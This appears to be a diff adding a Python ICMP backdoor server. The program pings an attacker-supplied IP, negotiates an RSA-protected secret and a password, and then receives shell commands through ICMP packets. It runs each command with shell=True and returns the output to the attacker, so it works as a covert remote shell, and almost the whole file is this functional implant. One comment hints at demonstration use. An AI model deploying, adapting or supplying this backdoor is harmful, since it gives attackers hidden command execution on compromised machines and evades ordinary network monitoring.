@@ -1,0 +1,169 @@
+#!/usr/bin/python3 -B
+
+from sys import argv
+from hashlib import sha256
+from subprocess import check_output
+from os import chdir, remove
+from socket import socket, AF_INET, SOCK_RAW, IPPROTO_ICMP
+from struct import pack, unpack
+from re import search, DOTALL
+from helper import ICMP, RSA
+
+ICMP_ECHO_REPLY = 0
+ICMP_ECHO_REQUEST = 8
+MAX_LEN = 65506
+EXIT_SIGNAL = {'quit', 'exit'}
+# used for testing
+DEBUG = False
+
+
+class BackdoorServer():
+    def __init__(self: object, host: str, password: str) -> None:
+        # create an instance of class ICMP
+        self.icmp = ICMP(host)
+        self.secret = None
+        # save password hash needed for authentication
+        self.hash = sha256(password.encode()).hexdigest()
+
+    def connect(self: object) -> bool:
+        # send heartbeat requests to attacker
+        self.heartbeat()
+        # when heartbeat reply is received, secure the connection by exchanging the secret
+        self.secure_connection()
+
+        # try to authenticate and return true if success; else false
+        return self.authenticate()
+
+    def heartbeat(self: object) -> None:
+        payload, address = None, None
+
+        # send heartbeats to the attacker
+        while True:
+            counter = 0
+            # send a heartbeat request
+            self.icmp.send_ping(1, b'?', ICMP_ECHO_REQUEST)
+            # wait for a heartbeat reply
+            payload, address = self.icmp.receive_ping(2)
+
+            # if the address matches and the payload is a heartbeat reply ('!'), break and return from function
+            if address == self.icmp.host and payload == b'!':
+                break
+
+    def secure_connection(self: object) -> None:
+        # generate a RSA private key
+        private_key = RSA.generate_private()
+        # generate a RSA public key from the private key
+        public_key = RSA.generate_public(private_key.decode())
+
+        # send the RSA public key to the attacker
+        self.icmp.send_ping(3, public_key, ICMP_ECHO_REQUEST)
+        # wait for the secret encrypted with the RSA public key
+        secret_enc, _ = self.icmp.receive_ping(4)
+        # decrypt the secret with the RSA private key and save it
+        self.secret = RSA.decrypt_secret(secret_enc, private_key)
+
+    def authenticate(self: object) -> bool:
+        # send a ping request
+        self.icmp.send_ping(5, b'auth', ICMP_ECHO_REQUEST, secret=self.secret)
+        # wait for the password needed for authentication encrypted with the secret
+        password, _ = self.icmp.receive_ping(6, secret=self.secret)
+        # check if the received password matches the password hash
+        response = b'okay' if sha256(password).hexdigest() == self.hash else b'nope'
+
+        # send 'okay' if authentication was successful; else, send 'nope'
+        self.icmp.send_ping(7, response, ICMP_ECHO_REQUEST, secret=self.secret)
+        # wait for a reply, no matter the response sent
+        self.icmp.receive_ping(8, secret=self.secret)
+
+        # if authentication was not successful, set secret to None and return False
+        if response == b'nope':
+            self.secret = None
+            return False
+
+        return True
+
+    def handle_exec(self: object) -> bool:
+        # send a ping request
+        self.icmp.send_ping(1, b'cmd', ICMP_ECHO_REQUEST, secret=self.secret)
+        # wait for a command
+        command, _ = self.icmp.receive_ping(2, secret=self.secret)
+        command = command.decode()
+        output = b''
+
+        # if command is an exit signal, return True
+        if command in EXIT_SIGNAL:
+            return True
+
+        # if command is not equal to 'quit' or 'exit', execute command
+        if command not in EXIT_SIGNAL:
+            try:
+                # if command is 'cd', change directory
+                if command.split()[0] == 'cd':
+                    chdir(command.split()[1])
+                # else, execute the command and save the output
+                else:
+                    output = check_output(command + ' 2>/dev/null', shell=True)
+            except:
+                output = b'Error while executing command!'
+        else:
+            output = b'okay'
+
+        # send the output of the executed command
+        self.icmp.send_ping(3, output, ICMP_ECHO_REQUEST, secret=self.secret)
+        # wait for a ping reply, no matter the output that was sent
+        self.icmp.receive_ping(4, secret=self.secret)
+
+        return False
+
+
+def main(argc: int, argv: list) -> None:
+    ip, password, debug = None, None, None
+
+    if argc == 3:
+        # get ip and password from command line
+        ip, password = argv[1:]
+    elif argc == 4:
+        # get ip, password and debug from command line
+        ip, password, debug = argv[1:]
+    else:
+        # if the needed arguments are not provided, print usage and exit
+        print('Usage: python3 {0} <ip> <password> <debug=true|false>'.format(argv[0]))
+        exit()
+
+    global DEBUG
+    DEBUG = debug == 'true'
+
+    while True:
+        try:
+            start_backdoor(ip, password)
+        except:  # noqa: E722
+            # set to break for demonstration purposes (should be continue)
+            break
+
+
+def start_backdoor(ip: str, password: str) -> None:
+    if DEBUG: print('[*] Waiting for connection...')
+
+    # create an instance of BackdoorServer
+    backdoor = BackdoorServer(ip, password)
+    # set the socket timeout to 3 seconds (needed for sending heartbeats periodically)
+    backdoor.icmp.connection.settimeout(3)
+
+    # if the connection was not successful, return/exit
+    if not backdoor.connect():
+        return
+
+    if DEBUG: print('[+] Connected.')
+    # set the socket timeout to indefinite
+    backdoor.icmp.connection.settimeout(None)
+
+    while True:
+        # if the backdoor has received an exit signal, close connection and wait for another one
+        if backdoor.handle_exec():
+            break
+
+    if DEBUG: print('[-] Connection closed.')
+
+
+if __name__ == '__main__':
+    main(len(argv), argv)
